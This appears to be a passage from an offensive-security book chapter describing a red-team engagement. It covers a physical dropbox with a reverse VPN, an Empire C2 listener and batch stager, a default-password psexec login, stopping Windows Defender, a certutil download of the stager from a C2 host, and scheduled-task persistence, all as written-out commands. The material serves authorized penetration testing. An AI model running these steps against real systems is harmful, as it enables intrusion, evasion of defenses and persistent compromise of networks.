This scenario combines the reverse VPN tunnel you created in Chapter 6 with the C2 server setup you used in Chapter 9. You’ll exploit the client’s system by deploying a dropbox, a physical device planted within a target environment that connects back to your infrastructure, giving you persistent access to the client’s network. To manage your implant payloads and callbacks from the compromised system, you’ll use a C2 server running Empire, a post-exploitation framework that utilizes PowerShell to execute agents on Windows systems, enabling remote command execution, credential harvesting, and lateral movement during security engagements.

Let’s set the stage. Once again, you’re working with an operator who has physical access to a client site. This time, however, the client’s local network configurations are a bit more restrictive than in Chapter 9. The hosts on their network can communicate only outbound (egress) to common web ports like 80, 8080, 443, and 8443. The high-level 8000 ports are reserved for their developers to access remote development environments, while the standard 80/443 ports allow for general internet access. The good news is that this means you can establish C2 communications after you’ve compromised a host on the network. The bad news is that any device you physically connect will have only network access, as egress is blocked by the client’s firewall.

One solution to this problem is using a dropbox. By dropping a device such as a Raspberry Pi or a small computer like an Intel Next Unit of Computing (NUC) at your client’s site, you gain some flexibility. You simply plug it into the network and provide it with a second internet connection so it can reach out to your remote services to create a VPN tunnel. You have a couple of options for achieving this, each of which has pros and cons:

Strapping a cellular hotspot to the device

Creating a wireless network on the client site means that even if your client catches your activity and blocks your C2 operations, you could potentially get back in. Thanks to the hotspot, you could drive into the parking lot, connect to the hotspot from your car, and access the internal network again without having to physically enter the building. However, you’d be emitting a wireless signal that a vigilant defensive team could detect, uncovering the location of your dropbox and risking your operation.

Installing a preconfigured cellular modem on a second network interface

Plugging a cellular modem directly into the device is a far stealthier option. If you attach the device to the network in a secure and hidden place, locating it will be a headache for the defensive team members, who may not be able to detect it at all. The downside is that if you do get caught, you won’t have the backup plan of being able to reconnect by simply driving within the hotspot’s range.

Either approach gets you on the local network such that you can drop off the system and leave to carry out other tasks while your onsite operator begins the local network exploitation. In this case, you’ll be simulating more of the second option, where your dropbox has either a built-in cellular modem or direct network access from your target.

This scenario will also demonstrate an attack that exploits a weak password resulting from the organization’s practice of provisioning easy-to-guess default credentials for its users. While this detail is important to the scenario context, your focus here isn’t on the red team operation narrative so much as on how you’ll apply your engineering skills. Your objective is to set up a dropbox and then configure a C2 server for your operator to call back to once they’ve compromised a system on the target network.

Configuring a Reverse VPN Dropbox
To simulate a dropbox, you’ll use the same Vagrant virtual machine you used in Chapter 6, but you’ll add this line of code to the Vagrantfile:

Vagrant.configure("2") do |config|
  config.vm.box = "ubuntu/bionic64"
  config.vm.network = "public_network", type: "dhcp"
end
This line adds an interface to the VM that represents a physical wire being attached that lets you on the client’s network, while the Network Address Translation (NAT) interface represents your cellular connection.

Spin this system up as follows:

user@localhost:~/Offensive-Security-Engineering/vagrant-ubuntu$ vagrant up
Bringing machine "default" up with 'virtualbox provider...
===> default: Checking if box ubuntu/bionic version 28200416.8.0 is up to date...
===> default: Clearing any previously set forwarded ports...
===> default: Clearing any previously set network interfaces...
===> default: Available bridged network interfaces:
1)en4: AXX88179 USB 3.0 to Gigabit Ethernet
2)en0: Wi-Fi (AirPort)
3)en1: Thunderbolt 1
4)en2: Thunderbolt 2
5)bridge0
6)p2p0
7)awdl0
8)llw0
===> default: When choosing an interface, it is usually the one that is
===> default: being used to connect to the internet.
     default: Which interface should the network bridge to? 2
Since you didn’t specify an interface in your Vagrant configuration file, the vagrant up command prompts you to select which one to use. This selection simulates how your dropbox connects to the client’s network: You’ve physically plugged an adapter into your host that you are passing through to the VM. If you were using something like the Metasploitable 3 VM to simulate an attack target, you could achieve the same result by simply connecting both VM hosts to your local network via your regular Ethernet or Wi-Fi interface.

Once the system is online, log in to the command line:

user@localhost:~/Offensive-Security-Engineering/vagrant-ubuntu$ vagrant ssh
After logging in, you need to establish your reverse VPN tunnel. I’ll skip the setup instructions because you’ll be using the same configuration from Chapter 9. If you still have that VPN tunnel running, feel free to reuse it; otherwise, just follow the same steps to rebuild the server, using the base-vpn directory’s Terraform code. Once your VPN certificate is copied to your dropbox, you can run the VPN:

vagrant@ubuntu-bionic:~$ sudo openvpn -–config dropbox.ovpn &
The & at the end of the command tells your terminal to run this process as a background job so that you can use this terminal session for other tasks if needed.

Back over on the VPN server, use pivpn -c to check whether your dropbox has successfully connected; your results should look similar to the following:

::: Client Status List :::
Name      Remote IP           Virtual IP   Bytes Received   Bytes Sent   Connected Since
dropbox   75.62.72.13:56657   10.8.0.2     3.2KiB           3.0KiB       Apr 19 2025 - 00:48:18
Once the dropbox has connected, you can access it remotely, leaving you free to leave the client site or focus on other objectives for the assessment:

vagrant@ubuntu-bionic:~$ ssh vagrant@10.8.0.2
Now your onsite operator is ready to act, but first you need to set up a C2 server so they can establish persistence after their initial compromise. For this example, you’ll use the PowerShell Empire framework (https://github.com/BC-SECURITY/Empire).

Using Empire on a C2 Server
Like Metasploit, Empire has been around for a long time and is easily detected but has powerful capabilities. Getting familiar with it will give you valuable experience configuring another C2 framework. In time, you’ll realize that most C2 frameworks are essentially the same in terms of architecture and deployment, and you’ll be able to quickly and easily test out the latest and greatest frameworks as they come out, extending your team’s capabilities and tooling options for all sorts of scenarios.

You’ll use the same C2 server you configured in Chapter 9 and start tmux again. If you’ve already torn down this server, spin it back up with the same configuration from the base-c2 directory. Once you have the server online, start Empire by first running sudo powershell-empire server (it should already be installed; if not, download it from the previously mentioned PowerShell Empire GitHub repository) in one terminal window, and sudo powershell-empire client in another. You should see the following output:

[INFO]: Starkiller served at the same ip and port as Empire Server
[INFO]: Starkiller served at http://localhost:1337/index.html
[INFO]: Started server process [31250]
[INFO]: Waiting for application startup.
[INFO]: Application startup complete.
[INFO]: Uvicorn running on http://0.0.0.0:1337 (Press CTRL+C to quit)
Figure 9-1 shows the startup process for the server and client.

Empire framework startup with large ASCII art depicting half a stormtrooper helmet and the word “EMPIRE” displayed in all-capital ASCII art
Figure 9-1: Starting PowerShell Empire

Once Empire has loaded, you should see the main menu shown in Figure 9-2.

Empire framework v5.12.2 with ASCII EMPIRE logo, showing 431 modules loaded, 0 listeners/agents, and advice to use Starkiller interface at localhost:1337.
Figure 9-2: The PowerShell Empire main menu

You’ll see the command prompt (Empire) >, and from here you can configure your C2 framework.

Configuring Empire
To configure your listener, run the following command followed by the TAB key:

(Empire) > uselistener
dbx    http    http_com    http_foreign    http_hop    http_mapi
Pressing TAB after entering the uselistener keyword shows you all the listener options Empire offers. You’ll use the basic http listener and configure it on port 80 just as you did with your Metasploit listener:

(Empire) > uselistener http
(Empire) > set Port 80
In addition to setting Port to 80, you need to configure Name and Host for the listener options. Name is just a label to help you keep track of listeners for various functions; in this case, you’re setting this value to dropbox and then setting Host to the same domain name you used previously, http://test-c2.injection.sh (although, just as before, you could use the public IP address here instead):

(Empire) > set Name dropbox
(Empire) > set Host http://test-c2.injection.sh
Similar to Metasploit, running options in any Empire context presents you with the options for the current module:

Run the following command from this context to start your listener:

(Empire: listeners/http) > execute

Now you’re ready to generate an implant.

Preparing an Empire C2 Stager
Generating an implant in Empire is intuitive once your listener is running. Although the options differ from other C2 frameworks, Empire has fewer to configure unless you need something specific with your implant.

By default, most implants in Empire are started via a stager, a small initial payload that establishes a connection with your C2 server and then downloads the full-featured implant. This two-stage approach helps you evade detection because the initial code is smaller and less suspicious, and the more complex implant is delivered only after a successful connection. Empire offers stagers with various options for different operating systems. Though primarily designed for Windows, Empire also supports Linux and macOS.

So, what you’re generating here is a stager program that fetches the real Empire implant if it is able to get an outbound connection. Although many users prefer pasting a simple PowerShell command into a command prompt to deploy their agents, in this exercise you’ll use a batch file launcher for consistency. Run usestager windows/launcher_bat to generate the launcher.

As with the listener context, running options in the stager context will present you with several options. The only option to change here is the listener you’re telling this stager to call back to, which in this case is dropbox:

(Empire: stager/windows/launcher_bat) > set Listener dropbox
Now run the following command to create your stager program:

(Empire: stager/windows/launcher_bat) > generate
[*] Stager output written out to: /tmp/launcher.bat
You can see that the batch file will be written to /tmp/launcher.bat on your Empire server. After gaining access, the operator will need to transfer the implant to the target host by taking advantage of the egress connections (ports 80, 8080, 443, 8443) that the client’s network permits. To allow for this, you need to serve your stager so the operator can run it after compromising the system. You want to make sure all the infrastructure is in place for the operator so that as soon as they gain access, they can move to the second step—maintaining access—right away.

Create a subfolder in /tmp called www to serve your stager from:

kali@kali:~$ cd /tmp
kali@kali:/tmp$ ls
c2_setup.sh.   launcher.bat
kali@kali:/tmp$ mkdir www
In a real-world scenario, you’d keep everything nicely organized by creating a payloads directory structure on your C2 server and storing your prepared implants there, but since you’re working with just one implant for this example, this approach works fine.

Next, move the launcher file into the newly created /tmp/www directory and start up a temporary web server on port 8080 (where you know you have egress) by using Python’s SimpleHTTPServer:

kali@kali:/tmp$ sudo mv launcher.bat www/.
kali@kali:/tmp$ cd www/
kali@kali:/tmp/www$ sudo su
root@kali:/tmp/www# ls
launcher.bat
root@kali:/tmp/www# python3 -m http.server 8080
Of course, a more secure way to perform this transfer would be over a server with a valid TLS certificate, but sometimes you have to work with unencrypted connections because of the constraints of the target environment. The optimal approach depends on your operational context. Using encrypted connections is always preferable, but a SimpleHTTPServer can be acceptable if it meets your immediate needs without the risk of compromising your operation.

Post-Exploitation via Python Impacket
Your operator is now ready to act. In Chapter 2, you saw CrackMapExec, a tool built on the Python Impacket tool kit. You’ll revisit Impacket now, so if you haven’t done so already, install it from https://github.com/fortra/impacket/. Impacket is primarily a library upon which you can develop attack tools and utilities, but it comes with a few examples, one of which is the psexec.py script you’ll use here.

The password attack mentioned earlier will provide post-exploitation access through Impacket rather than exploiting a known vulnerability. To successfully execute this attack, your operator will need more information. Thankfully, your team has just received intel about the organization’s password policy. You’ve learned that the system administrators often assign users a default password in the format firstname##, and that the primary administrator, John Doe, does not have a username on the network that reflects their real name. Inferring that John Doe might be using the built-in Administrator account within the Active Directory domain, the operator can attempt to gain access by using john## as the password like so (if you’re following along using a prebuilt vulnerable machine like Metasploitable 3, try this attack using the credentials vagrant/vagrant instead):

vagrant@ubuntu-bionic:~$ cd impacket/examples
vagrant@ubuntu-bionic:~/impacket/examples$ python psexec.py Administrator@192.168.2.100 cmd.exe
Impacket v0.9.21 – Copyright 2020 SecureAuth Corporation

Password: john##
...
While this is a made-up scenario, it’s not at all unrealistic. Organizations often use a predefined default password or pattern when creating accounts. If users aren’t required to reset their passwords the first time they log in, the organization can be vulnerable to password attacks. The risk is potentially higher for administrative or service accounts, where domain administrators might set simple, easy-to-remember credentials because they don’t log in and use these accounts regularly as a standard user does.

Your operator successfully guesses John Doe’s credentials and ends up with a command shell. Now, they begin performing their process checks and disabling Windows Defender just as in Chapter 9:

C:\Windows\system32>sc query windefend
C:\Windows\system32>sc stop windefend
The operator also verifies they have some outbound internet access via a quick ping to Google:

C:\Windows\system32>ping google.com

Pinging google.com [64.233.177.102] with 32 bytes of data:
Reply from 64.233.177.102: bytes=32 time=14ms TTL=41
Reply from 64.233.177.102: bytes=32 time=12ms TTL=41
Reply from 64.233.177.102: bytes=32 time=12ms TTL=41
Reply from 64.233.177.102: bytes=32 time=13ms TTL=41

Ping statistics for 64.233.177.102:

Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
Minimum = 12ms, Maximum = 14ms, Average = 12ms
With access confirmed, the operator is ready to deploy your stager.

Deploying the Empire Stager
The operator tries downloading and executing the stager as follows:

C:\>certutil -urlcache -split -f http://test-c2.injection.sh:8080/launcher.bat launcher.bat
If the operation is successful, the operator proceeds to the access maintenance step. They change the filename to the less conspicuous sys.bat:

C:\>move launcher.bat sys.bat
They then execute the stager and wait for confirmation on the callback:

C:\>.\sys.bat
C:\>Could Not Find C:\%~f0
The error Could Not Find C:\%~f0 is a minor syntax error within the sys.bat stager and can be safely ignored.

The Empire server receives the callback from the stager and sends the agent to be executed on the target system. The C2 communication has successfully been established, as indicated by the following output in the Empire server console:

(Empire: stager/windows/launcher_bat) >

[+] Initial agent K68G4HAX from 75.62.72.13 now active (Slack)
[*] Sending agent (stage 2) to K68G4HAX at 75.62.72.13
The operator executes the stager two more times to confirm sufficient access:

(Empire: stager/windows/launcher_bat) >

[+] Initial agent DLG3HCU1 from 75.62.72.13 now active (Slack)

To establish persistence, you have your choice of several post-exploitation modules from Empire that are similar to those in Metasploit but written in PowerShell or another language appropriate for this use case. This tactic is fairly well known and isn’t “opsec safe” because of the artifacts it generates, but it works for the purposes of testing your client via the Empire framework. In this case, your operator is now ready to act on the objective:

(Empire: powershell/persistence/elevated/schtasks) > execute

Summary
As an engineer, you have completed your mission. You’ve successfully deployed a dropbox that established a reverse VPN tunnel and configured a remote C2 server to facilitate post-exploitation operations. In a real-world engagement, use of a dropbox is one of the most common ways to gain initial access. In the context of most modern internal assessments, providing a dropbox to your client is often the most simple and effective way to begin an operation from behind the firewall.

This is often known as an “assumed breach,” where the client wants to test what would happen if they ever were compromised at their network perimeter. It’s also a quick and easy way to gain access to an internal network if you are incorporating physical tactics. If you’re authorized to break into a client’s office, you could use this access to leave behind a dropbox that will give you remote access later.

There are many other ways to configure dropboxes, but the reverse VPN method is reliable and used often. You also may want to observe things like reboot persistence for your dropbox. Try adding services that will allow the dropbox VPN connection to reconnect to your VPN server in the event of a powercycle or a reboot. This way you can be sure that even if the network goes down temporarily, you can resume access if the network comes back online.

With this knowledge, you’re now ready to move on to the next scenario to help your team successfully catch more shells: setting up a phishing campaign.
